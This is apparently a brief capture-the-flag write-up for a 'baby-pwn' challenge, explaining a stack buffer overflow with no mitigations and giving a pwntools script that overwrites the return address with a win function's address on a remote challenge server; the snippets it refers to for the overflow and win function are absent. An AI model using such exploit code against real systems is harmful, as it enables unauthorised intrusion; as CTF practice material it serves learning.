This is a simple pwn challenge. We have no mitigations enabled, and a buffer overflow:

We also have a win function:

We just need to overwrite the return address with the address of the win function:

```py
from pwn import *

context.log_level = 'debug'

elf = ELF("./baby-pwn")

'''
io = gdb.debug("./baby-pwn", """
    c
""")
'''
io = remote("34.162.142.123", 5000)
io.clean()
io.sendline(flat(
    b"A" * (64 + 1 * 8),
    p64(elf.sym.secret)
))
io.interactive()
```
